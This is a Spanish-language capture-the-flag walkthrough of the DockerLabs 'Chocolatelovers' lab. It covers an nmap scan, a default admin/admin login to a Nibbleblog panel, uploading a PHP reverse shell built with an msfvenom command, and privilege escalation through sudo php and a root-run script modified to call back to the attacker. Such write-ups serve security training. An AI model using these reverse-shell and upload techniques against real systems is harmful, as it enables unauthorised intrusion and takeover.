---
title: Chocolatelovers - DockerLabs
published: true
categories: DockerLabs
---
## Video de YouTube
<iframe width="560" height="315" src="https://www.youtube.com/embed/8lJjajSuY9k" frameborder="0" allowfullscreen></iframe>

 
| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  | Fácil       | ElPinguinoDeMario | 


## Escaneo y Reconocimiento de puertos

Vamos a iniciar nuestro reconocimiento con un rápido escaneo de nmap.

![image](https://github.com/romabri/romabri.github.io/assets/51706860/bfd9e0e3-2b4d-42be-b144-3ed39924fefa)


`nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2`
- `-p-` - Busqueda de puertos abiertos
- `--open` - Enumera los puertos abiertos
- `-sS` - Es un modo de escaneo rapido
- `-sC-` - Que use un conjunto de scripts de reconocimiento
- `-sV` - Que encuentre la version del servicio abirto
- `--min-rate=5000` - Hace que el reconocimiento aun vaya mas rapido mandando no menos de 5000 paquetes
- `-n` - No hace resolución DNS
- `-Pn` - No hace ping
- `-vvv` - Muestra en pantalla a medida que encuentra puertos (Verbose)

Vemos que esta abierto el puerto 80 `HTTP`

## Web

![image](https://github.com/romabri/romabri.github.io/assets/51706860/fb5d58ca-8a81-4384-b634-b8b8907fa723)

Vamos a mirar en el codigo fuente.

![image](https://github.com/romabri/romabri.github.io/assets/51706860/15bcd4a1-3e83-4d7a-a84f-cc6ddd24d93e)

Esto es posiblemente una ruta de la web vamos a ver que hay

![image](https://github.com/romabri/romabri.github.io/assets/51706860/884137c1-2ece-4a50-9345-6dcc177e240a)

Tenemos un enlaze que nos lleva al admin.php nos encontramos con un panel de acceso

![image](https://github.com/romabri/romabri.github.io/assets/51706860/d419a092-2b27-49b6-9f5d-6a8adcd7cf63)

Si ponemos admin admin accedemos

![image](https://github.com/romabri/romabri.github.io/assets/51706860/f735b18e-139e-4b90-a288-d222e587df93)

Si vamos a Plugins hemos de instalar el plugin My image, y ahi haremos lo siguiente:

![image](https://github.com/romabri/romabri.github.io/assets/51706860/f7bc22a4-cdfa-4436-8554-e854239476d3)

Generaremos un payload con msfvenom para generar una reverse shell en un archivo php de la siguiente manera

msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=443 -f raw > pwned.php

Este archivo lo subiremos dandole a browse y save changes.

Una vez hecho esto si investigamos un poco por la web vemos que en este repositorio estan los plugins http://172.17.0.2/nibbleblog/content/private/plugins/

![image](https://github.com/romabri/romabri.github.io/assets/51706860/75627b58-ee4c-4b21-81b5-9202645d5aa1)

El archivo malicioso se nos ha subido es el image.php.

Ahora vamos con net cat a quedarnos en escucha y veremos si nos manda una reverse shell.

## Intrusión

![image](https://github.com/romabri/romabri.github.io/assets/51706860/557c85c6-c4d0-493f-8510-63fcce632fd3)

Ya estamos dentro de la maquina
Si hacemos sudo -l vemos que como el usuario chocolate podemos ejecutar el php vamos a buscar como escalar con PHP

![image](https://github.com/romabri/romabri.github.io/assets/51706860/4d7c1a8d-a85a-41f1-969d-a3d5310b67c8)

## Escalada de privilegios

![image](https://github.com/romabri/romabri.github.io/assets/51706860/db03520a-1046-4e53-8226-d6d59e2d8ed7)

Ya hemos escalado 
Si hacemos un ps -e -f
Vemos un script que lo ejecuta root que no hay nada dentro vamos a intentar escalar a traves de ahí.

![image](https://github.com/romabri/romabri.github.io/assets/51706860/a05e06e0-4587-4753-ab45-ee98faee46f1)

Modificamos el script introduciendo una reverse-shell.php de las webshells la ip la ponemos a nuestra maquina atacantes y el puerto por ejemplo ponemos el 1122 y si esperemos un momento...

![image](https://github.com/romabri/romabri.github.io/assets/51706860/8c5b94b6-c189-4340-a44a-a94a65d4c090)

YA SOMOS ROOT!



















